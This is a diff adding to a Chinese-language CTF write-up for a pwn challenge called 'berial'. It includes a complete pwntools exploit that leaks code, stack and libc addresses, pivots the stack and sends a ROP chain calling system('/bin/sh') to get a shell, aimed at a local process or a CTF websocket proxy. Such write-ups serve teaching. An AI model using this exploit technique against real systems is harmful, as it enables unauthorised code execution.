@@ -248,8 +248,82 @@ log.success('__libc_start_main_base: ' + hex(__libc_start_main_base))
 ![[Pasted image 20250211193505.png]]
 第五步，构造ROP获取shell。
 ```python
+libc_base = __libc_start_main_base - libc.sym['__libc_start_main']
 
+system = libc_base + libc.sym['system']
+binsh = libc_base + 0x1d8678
+pop_rdi = libc_base + 0x2a3e5
+
+# payload6构造ROP链获取shell
+payload6 = p64(pop_rdi) + p64(binsh) + p64(system) + b'\x00' * 0x8 + p64(stack_addr + 0x88) + p64(leave_ret)
+p.sendafter(b'berial: ', payload6)
 ```
+完整exp:
+```python
+from pwn import *
+from wstube import websocket
+
+context(arch='amd64', os='linux', log_level='debug')
+local = True
+if local:
+	p = process('./berial')
+	pwnlib.gdb.attach(p, 'b read')
+else:
+	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f43b-72fc-7693-beac-89fcb498f37e')
+
+libc = ELF('./libc/libc.so.6')
+
+# payload1泄漏code段地址
+payload1 = b'a' * (0x28 - 1) + b'b'
+p.sendafter('name: ', payload1)
+p.recvuntil(b'ab')
+func_addr = u64(p.recv(6).ljust(8, b'\x00'))
+func_base = func_addr - 0x10138d
+
+ret = func_base + 0x10101a
+leave_ret = func_base + 0x1012aa
+func_addr = func_base + 0x1011e9
+log.success('func_addr: ' + hex(func_addr))
+log.success('func_base: ' + hex(func_base))
+
+# payload2回到func函数再次执行
+payload2 = b'a' * 0x28 + p64(ret) + p64(func_base + 0x101367)
+p.recvuntil(b'berial: ')
+p.send(payload2)
+  
+# payload3泄漏栈地址
+payload3 = b'a' * (0x20 - 1) + b'c'
+p.sendafter('name: ', payload3)
+p.recvuntil(b'ac')
+stack_addr = u64(p.recv(6).ljust(8, b'\x00'))
+log.success('stack_addr: ' + hex(stack_addr))
+
+# payload4开始构造栈迁移泄漏libc基址
+payload4 = p64(stack_addr + 0xb0) + p64(func_base + 0x101229) + b'a' * 0x10 + p64(stack_addr - 0x30) + p64(leave_ret) + b'\x00' * 0x8
+p.sendafter(b'berial: ', payload4)
+# payload4已经将栈迁移到位置，payload5泄漏__libc_start_main地址
+payload5 = b'a' * (0x20 - 8 - 1) + b'd'
+p.send(payload5)
+p.recvuntil(b'ad')
+__libc_start_main_add = u64(p.recv(6).ljust(8, b'\x00'))
+__libc_start_main_base = __libc_start_main_add - 128
+log.success('__libc_start_main_add: ' + hex(__libc_start_main_add))
+log.success('__libc_start_main_base: ' + hex(__libc_start_main_base))
+
+libc_base = __libc_start_main_base - libc.sym['__libc_start_main']
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + 0x1d8678
+pop_rdi = libc_base + 0x2a3e5
+
+# payload6构造ROP链获取shell
+payload6 = p64(pop_rdi) + p64(binsh) + p64(system) + b'\x00' * 0x8 + p64(stack_addr + 0x88) + p64(leave_ret)
+p.sendafter(b'berial: ', payload6)
+
+p.interactive()
+```
+shell：
+
 ## unjoke
 
 ## Natro
